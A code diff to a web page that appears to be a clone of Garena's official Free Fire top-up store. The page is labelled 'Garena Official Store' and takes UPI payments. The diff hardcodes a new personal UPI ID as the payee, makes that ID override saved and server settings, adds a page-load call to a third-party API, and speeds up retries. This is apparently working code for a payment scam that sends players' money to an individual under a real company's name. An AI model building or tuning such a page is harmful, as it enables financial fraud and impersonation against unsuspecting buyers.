@@ -1621,16 +1621,32 @@
     const CONFIG_KEY = 'garena_clone_config';
     // DEFAULT_CONFIG contains only non-sensitive display defaults.
     // UPI ID and merchant name are loaded from server via syncAdminStore().
-    const DEFAULT_CONFIG = { upiId: 'paytm.s2sr8jx@pty', merchantName: 'Garena Official Store' };
+    const DEFAULT_CONFIG = { upiId: '888999444719@ybl', merchantName: 'Garena Official Store' };
     let activeConfig = { ...DEFAULT_CONFIG };
-    activeConfig.upiId = 'paytm.s2sr8jx@pty';
+    activeConfig.upiId = '888999444719@ybl';
     try {
       var savedCfg = JSON.parse(localStorage.getItem(CONFIG_KEY));
       if (savedCfg && savedCfg.merchantName) activeConfig.merchantName = savedCfg.merchantName;
     } catch(e) {}
+    localStorage.removeItem(CONFIG_KEY);
     localStorage.setItem(CONFIG_KEY, JSON.stringify(activeConfig));
 
-    let currentUid = localStorage.getItem('ff_verified_uid') || '';
+
+    // ── API Warm-Up: pre-ping Garena API on page load to eliminate Vercel cold-start ──
+    (function warmUpApi() {
+      try {
+        var warmController = typeof AbortController !== 'undefined' ? new AbortController() : null;
+        var warmSignal = warmController ? warmController.signal : undefined;
+        // Cancel warm-up after 10s to avoid memory leak
+        if (warmController) setTimeout(function() { warmController.abort(); }, 10000);
+        fetch('https://sehrab-api.vercel.app/api/v1/info?uid=1&region=IND', {
+          method: 'GET',
+          cache: 'no-store',
+          signal: warmSignal
+        }).catch(function() {});
+      } catch(e) {}
+    })();
+        let currentUid = localStorage.getItem('ff_verified_uid') || '';
     let userCountry = sessionStorage.getItem('user_country') || 'Unknown';
 
     // Detect visitor country once per session using free geo API
@@ -1731,7 +1747,7 @@
             var st = (data && Array.isArray(data.products)) ? data : (data.state || data);
             if (st) {
               if (st.upiId) {
-                activeConfig.upiId = 'paytm.s2sr8jx@pty';
+                activeConfig.upiId = st.upiId || '888999444719@ybl';
                 if (st.merchantName) activeConfig.merchantName = st.merchantName;
                 localStorage.setItem(CONFIG_KEY, JSON.stringify(activeConfig));
               }
@@ -2121,7 +2137,7 @@
                 resolve(norm);
               } else if (attempt < 3) {
                 // Retry after 1s if got bad data
-                setTimeout(function() { tryFetch(attempt + 1); }, 1000);
+                setTimeout(function() { tryFetch(attempt + 1); }, 300);
               } else {
                 // All retries exhausted — resolve null (no fake data)
                 done = true;
@@ -2131,7 +2147,7 @@
             .catch(function() {
               if (done) return;
               if (attempt < 3) {
-                setTimeout(function() { tryFetch(attempt + 1); }, 1500);
+                setTimeout(function() { tryFetch(attempt + 1); }, 500);
               } else {
                 done = true;
                 resolve(null);
@@ -2144,7 +2160,7 @@
         // 12s hard timeout — long enough for 3 retries
         setTimeout(function() {
           if (!done) { done = true; resolve(null); }
-        }, 12000);
+        }, 8000);
       });
 
       // Visual step animation timers
